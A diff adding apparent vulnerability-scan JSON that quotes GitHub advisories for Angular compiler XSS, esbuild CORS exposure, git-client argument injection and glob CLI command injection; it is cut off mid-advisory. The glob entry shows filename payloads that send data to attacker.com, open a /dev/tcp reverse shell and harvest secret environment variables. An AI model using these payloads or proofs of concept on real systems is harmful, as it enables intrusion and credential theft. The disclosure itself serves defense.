+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "last_affected": "18.2.14"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-66412"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-12-02T01:20:30Z",
+                "nvd_published_at": "2025-12-01T23:15:53Z",
+                "severity": "HIGH"
+              },
+              "details": "A **Stored Cross-Site Scripting ([XSS](https://angular.dev/best-practices/security#preventing-cross-site-scripting-xss))** vulnerability has been identified in the **Angular Template Compiler**. It occurs because the compiler's internal security schema is incomplete, allowing attackers to bypass Angular's built-in security sanitization. Specifically, the schema fails to classify certain URL-holding attributes (e.g., those that could contain [`javascript:` URLs](https://developer.mozilla.org/en-US/Web/URI/Reference/Schemes/javascript)) as requiring strict URL security, enabling the injection of malicious scripts.\n\nAdditionally, a related vulnerability exists involving SVG animation elements (`\u003canimate\u003e`, `\u003cset\u003e`, `\u003canimateMotion\u003e`, `\u003canimateTransform\u003e`). The `attributeName` attribute on these elements was not properly validated, allowing attackers to dynamically target security-sensitive attributes like `href` or `xlink:href` on other elements. By binding `attributeName` to \"href\" and providing a `javascript:` URL in the `values` or `to` attribute, an attacker could bypass sanitization and execute arbitrary code.\n\nAttributes confirmed to be vulnerable include:\n*   SVG-related attributes: (e.g., `xlink:href`), and various MathML attributes (e.g., `math|href`, `annotation|href`).\n*   SVG animation `attributeName` attribute when bound to \"href\" or \"xlink:href\".\n\nWhen template binding is used to assign untrusted, user-controlled data to these attributes (e.g., `[attr.xlink:href]=\"maliciousURL\"` or `\u003canimate [attributeName]=\"'href'\" [values]=\"maliciousURL\"\u003e`), the compiler incorrectly falls back to a non-sanitizing context or fails to block the dangerous attribute assignment. This allows an attacker to inject a `javascript:URL` payload. Upon user interaction (like a click) on the element, or automatically in the case of animations, the malicious JavaScript executes in the context of the application's origin.\n\n### Impact\n\nWhen exploited, this vulnerability allows an attacker to execute arbitrary code within the context of the vulnerable application's domain. This enables:\n\n* **Session Hijacking:** Stealing session cookies and authentication tokens.  \n* **Data Exfiltration:** Capturing and transmitting sensitive user data.  \n* **Unauthorized Actions:** Performing actions on behalf of the user.\n\n### Patches\n\n- 19.2.17\n- 20.3.15\n- 21.0.2\n\n### Attack Preconditions\n\n* The victim's Angular application must render data derived from **untrusted input** (e.g., from a database or API) and bind it to one of the unsanitized URL attributes or the `attributeName` of an SVG animation element.\n* The victim must perform a **user interaction** (e.g., clicking) on the compromised element for the stored script to execute, or the animation must trigger the execution.\n\n### Workarounds\n\nIf you cannot upgrade, you can workaround the issue by ensuring that any data bound to the vulnerable attributes is never sourced from untrusted user input (e.g., database, API response, URL parameters).\n\n* **Avoid Affected Template Bindings:** Specifically avoid using template bindings (e.g., `[attr.xlink:href]=\"maliciousURL\"`) to assign untrusted data to the vulnerable SVG/MathML attributes.\n* **Avoid Dynamic `attributeName` on SVG Animations:** Do not bind untrusted data to the `attributeName` attribute of SVG animation elements (`\u003canimate\u003e`, `\u003cset\u003e`, etc.).\n* **Enable [Content Security Policy (CSP)](https://angular.dev/best-practices/security#content-security-policy):** Configure a robust CSP header that disallows `javascript:` URLs.",
+              "id": "GHSA-v4hv-rgfq-gp49",
+              "modified": "2025-12-02T01:38:38.792648Z",
+              "published": "2025-12-02T01:20:30Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/security/advisories/GHSA-v4hv-rgfq-gp49"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66412"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/1c6b0704fb63d051fab8acff84d076abfbc4893a"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/angular/angular"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Angular Stored XSS Vulnerability via SVG Animation, SVG URL and MathML Attributes"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "@angular/compiler",
+            "version": "18.1.0-rc.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-v4hv-rgfq-gp49"
+              ],
+              "aliases": [
+                "CVE-2025-66412",
+                "GHSA-v4hv-rgfq-gp49"
+              ],
+              "max_severity": "8.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "21.0.0-next.0"
+                        },
+                        {
+                          "fixed": "21.0.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "20.0.0-next.0"
+                        },
+                        {
+                          "fixed": "20.3.15"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "19.0.0-next.0"
+                        },
+                        {
+                          "fixed": "19.2.17"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "last_affected": "18.2.14"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-66412"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-12-02T01:20:30Z",
+                "nvd_published_at": "2025-12-01T23:15:53Z",
+                "severity": "HIGH"
+              },
+              "details": "A **Stored Cross-Site Scripting ([XSS](https://angular.dev/best-practices/security#preventing-cross-site-scripting-xss))** vulnerability has been identified in the **Angular Template Compiler**. It occurs because the compiler's internal security schema is incomplete, allowing attackers to bypass Angular's built-in security sanitization. Specifically, the schema fails to classify certain URL-holding attributes (e.g., those that could contain [`javascript:` URLs](https://developer.mozilla.org/en-US/Web/URI/Reference/Schemes/javascript)) as requiring strict URL security, enabling the injection of malicious scripts.\n\nAdditionally, a related vulnerability exists involving SVG animation elements (`\u003canimate\u003e`, `\u003cset\u003e`, `\u003canimateMotion\u003e`, `\u003canimateTransform\u003e`). The `attributeName` attribute on these elements was not properly validated, allowing attackers to dynamically target security-sensitive attributes like `href` or `xlink:href` on other elements. By binding `attributeName` to \"href\" and providing a `javascript:` URL in the `values` or `to` attribute, an attacker could bypass sanitization and execute arbitrary code.\n\nAttributes confirmed to be vulnerable include:\n*   SVG-related attributes: (e.g., `xlink:href`), and various MathML attributes (e.g., `math|href`, `annotation|href`).\n*   SVG animation `attributeName` attribute when bound to \"href\" or \"xlink:href\".\n\nWhen template binding is used to assign untrusted, user-controlled data to these attributes (e.g., `[attr.xlink:href]=\"maliciousURL\"` or `\u003canimate [attributeName]=\"'href'\" [values]=\"maliciousURL\"\u003e`), the compiler incorrectly falls back to a non-sanitizing context or fails to block the dangerous attribute assignment. This allows an attacker to inject a `javascript:URL` payload. Upon user interaction (like a click) on the element, or automatically in the case of animations, the malicious JavaScript executes in the context of the application's origin.\n\n### Impact\n\nWhen exploited, this vulnerability allows an attacker to execute arbitrary code within the context of the vulnerable application's domain. This enables:\n\n* **Session Hijacking:** Stealing session cookies and authentication tokens.  \n* **Data Exfiltration:** Capturing and transmitting sensitive user data.  \n* **Unauthorized Actions:** Performing actions on behalf of the user.\n\n### Patches\n\n- 19.2.17\n- 20.3.15\n- 21.0.2\n\n### Attack Preconditions\n\n* The victim's Angular application must render data derived from **untrusted input** (e.g., from a database or API) and bind it to one of the unsanitized URL attributes or the `attributeName` of an SVG animation element.\n* The victim must perform a **user interaction** (e.g., clicking) on the compromised element for the stored script to execute, or the animation must trigger the execution.\n\n### Workarounds\n\nIf you cannot upgrade, you can workaround the issue by ensuring that any data bound to the vulnerable attributes is never sourced from untrusted user input (e.g., database, API response, URL parameters).\n\n* **Avoid Affected Template Bindings:** Specifically avoid using template bindings (e.g., `[attr.xlink:href]=\"maliciousURL\"`) to assign untrusted data to the vulnerable SVG/MathML attributes.\n* **Avoid Dynamic `attributeName` on SVG Animations:** Do not bind untrusted data to the `attributeName` attribute of SVG animation elements (`\u003canimate\u003e`, `\u003cset\u003e`, etc.).\n* **Enable [Content Security Policy (CSP)](https://angular.dev/best-practices/security#content-security-policy):** Configure a robust CSP header that disallows `javascript:` URLs.",
+              "id": "GHSA-v4hv-rgfq-gp49",
+              "modified": "2025-12-02T01:38:38.792648Z",
+              "published": "2025-12-02T01:20:30Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/security/advisories/GHSA-v4hv-rgfq-gp49"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66412"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/1c6b0704fb63d051fab8acff84d076abfbc4893a"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/angular/angular"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Angular Stored XSS Vulnerability via SVG Animation, SVG URL and MathML Attributes"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "esbuild",
+            "version": "0.14.39",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-67mh-4wv8-2f99"
+              ],
+              "aliases": [
+                "GHSA-67mh-4wv8-2f99"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.24.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-67mh-4wv8-2f99/GHSA-67mh-4wv8-2f99.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "esbuild",
+                    "purl": "pkg:npm/esbuild"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.25.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-346"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-02-10T17:48:07Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e =\u003e console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r =\u003e r.text()).then(content =\u003e console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+              "id": "GHSA-67mh-4wv8-2f99",
+              "modified": "2025-02-10T17:48:08Z",
+              "published": "2025-02-10T17:48:07Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/evanw/esbuild"
+                }
+              ],
+              "related": [
+                "CGA-4v28-58cf-ggx7",
+                "CGA-5qqq-3383-mhjr",
+                "CGA-75rh-2q2q-wm52",
+                "CGA-m983-9xr3-349j",
+                "CGA-mhg6-chj9-5v88",
+                "CGA-rjff-7jch-vw6j",
+                "CGA-w25f-r54p-vh94"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "esbuild enables any website to send any requests to the development server and read the response"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "esbuild",
+            "version": "0.23.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-67mh-4wv8-2f99"
+              ],
+              "aliases": [
+                "GHSA-67mh-4wv8-2f99"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.24.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-67mh-4wv8-2f99/GHSA-67mh-4wv8-2f99.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "esbuild",
+                    "purl": "pkg:npm/esbuild"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.25.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-346"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-02-10T17:48:07Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e =\u003e console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r =\u003e r.text()).then(content =\u003e console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+              "id": "GHSA-67mh-4wv8-2f99",
+              "modified": "2025-02-10T17:48:08Z",
+              "published": "2025-02-10T17:48:07Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/evanw/esbuild"
+                }
+              ],
+              "related": [
+                "CGA-4v28-58cf-ggx7",
+                "CGA-5qqq-3383-mhjr",
+                "CGA-75rh-2q2q-wm52",
+                "CGA-m983-9xr3-349j",
+                "CGA-mhg6-chj9-5v88",
+                "CGA-rjff-7jch-vw6j",
+                "CGA-w25f-r54p-vh94"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "esbuild enables any website to send any requests to the development server and read the response"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "@conventional-changelog/git-client",
+            "version": "1.0.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-vh25-5764-9wcr"
+              ],
+              "aliases": [
+                "CVE-2025-59433",
+                "GHSA-vh25-5764-9wcr"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vh25-5764-9wcr/GHSA-vh25-5764-9wcr.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@conventional-changelog/git-client",
+                    "purl": "pkg:npm/%40conventional-changelog/git-client"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.0.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-59433"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-88"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-09-22T18:01:01Z",
+                "nvd_published_at": "2025-09-22T20:15:38Z",
+                "severity": "MODERATE"
+              },
+              "details": "## Background on exploitation\n\nThis vulnerability manifests with the library's `getTags()` API,\nwhich allows specifying extra parameters passed to the `git log` command. In another API by this library - `getRawCommits()` there are secure practices taken to ensure that the extra parameter `path` is unable to inject an argument by ending the `git log` command with the special shell syntax `--`.\nHowever, the library does not follow the same practice for `getTags()` not attempts to sanitize for user input, validate the given params, or restrcit them to an allow list. Nor does it properly pass command-line flags to the `git` binary using the double-dash POSIX characters (`--`) to communicate the end of options.\n\nThus, allowing users to exploit an argument injection vulnerability in Git due to the\n`--output=` command-line option that results with overwriting arbitrary files.\n\n## Exploit\n\n1. Install `@conventional-changelog/git-client@1.0.1` or earlier\n2. Prepare a Git directory to be used as source\n3. Create the following script for the proof-of-concept:\n\n```js\nimport {\n  GitClient,\n} from \"@conventional-changelog/git-client\";\n\nasync function main() {\n  const gitDirectory = \"/tmp/some-git-directory\";\n  const client = new GitClient(gitDirectory);\n\n  const params = [\"--output=/tmp/r2d2\"];\n  for await (const tag of client.getTags(params)) {\n    console.log(tag);\n  }\n}\n\nmain();\n```\n\n3. Observe new file created on disk at `/tmp/r2d2`\n\n## Impact\n\nWhile the scope is only limited to writing a file with input from the git log result, it still allows to specify and overwrite any arbitrary files on disk, such as `.env` or as far as critical system configuration at `/etc` if the application is running as privileged `root` user.\n\nIt may be the library's design choice to expose a generic `params` object to allow any consuming users to specify random Git command line arguments, however it could be abused by attackers when developers aren't aware of the security risks which aren't communicated. As such, I recommend not ignoring, and either patching this insecure design gap with hardened secure coding practices (like in other APIs mentioned previously) or adding a security disclaimer to this library's documentation.\n\n# Author / Credit\n\nLiran Tal",
+              "id": "GHSA-vh25-5764-9wcr",
+              "modified": "2025-09-22T21:59:10Z",
+              "published": "2025-09-22T18:01:01Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/conventional-changelog/conventional-changelog/security/advisories/GHSA-vh25-5764-9wcr"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59433"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/conventional-changelog/conventional-changelog/commit/d95c9ffac05af58228bd89fa0ba37ad65741c6a2"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/conventional-changelog/conventional-changelog"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "@conventional-changelog/git-client has Argument Injection vulnerability"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "glob",
+            "version": "10.4.5",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5j98-mcp5-4vw2"
+              ],
+              "aliases": [
+                "CVE-2025-64756",
+                "GHSA-5j98-mcp5-4vw2"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-5j98-mcp5-4vw2/GHSA-5j98-mcp5-4vw2.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "glob",
+                    "purl": "pkg:npm/glob"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "11.0.0"
+                        },
+                        {
+                          "fixed": "11.1.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-5j98-mcp5-4vw2/GHSA-5j98-mcp5-4vw2.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "glob",
+                    "purl": "pkg:npm/glob"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "10.2.0"
+                        },
+                        {
+                          "fixed": "10.5.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-64756"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-78"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-17T17:38:56Z",
+                "nvd_published_at": "2025-11-17T18:15:58Z",
+                "severity": "HIGH"
+              },
+              "details": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c \u003ccommand\u003e \u003cpatterns\u003e` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () =\u003e foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c \u003ccommand\u003e \u003cpattern\u003e` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `\u0026`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory \u0026\u0026 cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)\ntouch '$(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- 